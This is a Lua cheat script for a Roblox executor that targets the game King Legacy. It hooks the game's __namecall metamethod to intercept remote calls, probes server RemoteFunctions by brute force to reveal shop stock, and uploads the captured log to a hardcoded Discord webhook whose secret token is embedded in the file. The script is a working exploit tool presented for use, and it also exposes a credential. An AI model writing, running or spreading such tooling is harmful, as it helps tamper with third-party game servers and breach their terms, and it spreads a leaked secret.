-- KING LEGACY - REMOTE SPY
-- 1. Run this script
-- 2. Walk to the fruit dealer / black market NPC and OPEN THE SHOP once
-- 3. Read console + Discord for which remote carries the stock
-- It logs for 120 seconds then stops on its own.

local HttpService = game:GetService("HttpService")
local RS = game:GetService("ReplicatedStorage")
local LocalPlayer = game.Players.LocalPlayer
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1375178535198785586/-kGnmx4QJnWlOOqPutLGurRu132ALTTAne8d4MMgNvTJg825vkpT1yU9R_-s74GBDO9z"

local SPY_DURATION = 120
local KEYWORDS = {"fruit", "shop", "market", "stock", "buy", "dealer", "rotate", "restock"}

local lines = {}
local function log(s)
    print(s)
    table.insert(lines, tostring(s))
end

local function pathOf(obj)
    local parts, cur = {}, obj
    while cur and cur ~= game do
        table.insert(parts, 1, cur.Name)
        cur = cur.Parent
    end
    return table.concat(parts, ".")
end

local function isInteresting(name)
    local l = string.lower(tostring(name))
    for _, k in ipairs(KEYWORDS) do
        if l:find(k, 1, true) then return true end
    end
    return false
end

-- Safe serializer (tables can be deep / cyclic)
local function ser(v, depth, seen)
    depth = depth or 0
    seen = seen or {}
    local t = type(v)
    if t == "table" then
        if seen[v] then return "<cycle>" end
        if depth > 4 then return "<deep>" end
        seen[v] = true
        local out, n = {}, 0
        for k, val in pairs(v) do
            n = n + 1
            if n > 40 then table.insert(out, "...") break end
            table.insert(out, "[" .. tostring(k) .. "]=" .. ser(val, depth + 1, seen))
        end
        return "{" .. table.concat(out, ", ") .. "}"
    elseif t == "userdata" then
        local ok, cls = pcall(function() return v.ClassName end)
        if ok then return "<" .. tostring(cls) .. ":" .. tostring(v) .. ">" end
        return "<userdata>"
    elseif t == "string" then
        return '"' .. v .. '"'
    end
    return tostring(v)
end

-- ==== PART 1: static scan of remotes ====
log("========== REMOTES IN REPLICATEDSTORAGE ==========")
local remotes = {}
for _, d in ipairs(RS:GetDescendants()) do
    if d:IsA("RemoteFunction") or d:IsA("RemoteEvent") then
        table.insert(remotes, d)
        if isInteresting(d.Name) then
            log("  ⭐ " .. d.ClassName .. "  " .. pathOf(d))
        end
    end
end
log("  (total remotes: " .. #remotes .. ", starred = name matched a keyword)")

-- ==== PART 2: any replicated stock values sitting in the open ====
log("")
log("========== VALUE OBJECTS / FOLDERS THAT LOOK LIKE STOCK ==========")
local found = 0
for _, root in ipairs({RS, workspace, game:GetService("Lighting")}) do
    for _, d in ipairs(root:GetDescendants()) do
        if isInteresting(d.Name)
            and (d:IsA("ValueBase") or d:IsA("Folder") or d:IsA("Configuration")) then
            found = found + 1
            if found <= 25 then
                local extra = ""
                if d:IsA("ValueBase") then extra = " = " .. tostring(d.Value) end
                log("  " .. d.ClassName .. "  " .. pathOf(d) .. extra)
            end
        end
    end
end
log("  total: " .. found)

-- ==== PART 3: live hook ====
log("")
log("========== LIVE SPY: OPEN THE SHOP NOW ==========")

local hooked = false
local oldNamecall

local ok, err = pcall(function()
    local mt = getrawmetatable(game)
    setreadonly(mt, false)
    oldNamecall = mt.__namecall

    mt.__namecall = newcclosure(function(self, ...)
        local method = getnamecallmethod()
        local args = {...}

        if (method == "FireServer" or method == "InvokeServer")
            and typeof(self) == "Instance" then
            local ok2 = pcall(function()
                log("→ " .. method .. "  " .. pathOf(self))
                for i, a in ipairs(args) do
                    log("      arg" .. i .. " = " .. ser(a))
                end
            end)

            if method == "InvokeServer" then
                local results = {oldNamecall(self, ...)}
                pcall(function()
                    log("   ← RETURNED: " .. ser(results))
                end)
                return unpack(results)
            end
        end

        return oldNamecall(self, ...)
    end)

    setreadonly(mt, true)
    hooked = true
end)

if not hooked then
    log("!! namecall hook failed: " .. tostring(err))
    log("!! Your executor may not support getrawmetatable/newcclosure.")
    log("!! Fallback: manually InvokeServer on the starred remotes above.")
end

-- ==== PART 4: brute-force probe any RemoteFunction with a matching name ====
log("")
log("========== PROBING REMOTEFUNCTIONS ==========")
for _, r in ipairs(remotes) do
    if r:IsA("RemoteFunction") and isInteresting(r.Name) then
        local ok3, res = pcall(function() return r:InvokeServer() end)
        if ok3 then
            log("  " .. pathOf(r) .. " -> " .. ser(res))
        else
            local ok4, res2 = pcall(function() return r:InvokeServer("Get") end)
            if ok4 then
                log("  " .. pathOf(r) .. " (\"Get\") -> " .. ser(res2))
            else
                log("  " .. pathOf(r) .. " -> error: " .. tostring(res))
            end
        end
        wait(0.2)
    end
end

-- ==== PART 5: wait, then ship ====
log("")
log("(spying for " .. SPY_DURATION .. "s - open the shop now)")
wait(SPY_DURATION)

-- unhook
pcall(function()
    local mt = getrawmetatable(game)
    setreadonly(mt, false)
    mt.__namecall = oldNamecall
    setreadonly(mt, true)
end)
log("== spy stopped ==")

local full = table.concat(lines, "\n")
print("\n=== LOG LENGTH: " .. #full .. " chars ===")
local CHUNK, part = 1800, 1
for i = 1, #full, CHUNK do
    local piece = full:sub(i, i + CHUNK - 1)
    pcall(function()
        request({
            Url = DISCORD_WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                content = "**SPY part " .. part .. "**\n```\n" .. piece .. "\n```"
            })
        })
    end)
    part = part + 1
    wait(0.6)
end
print("✅ Sent in " .. (part - 1) .. " parts")
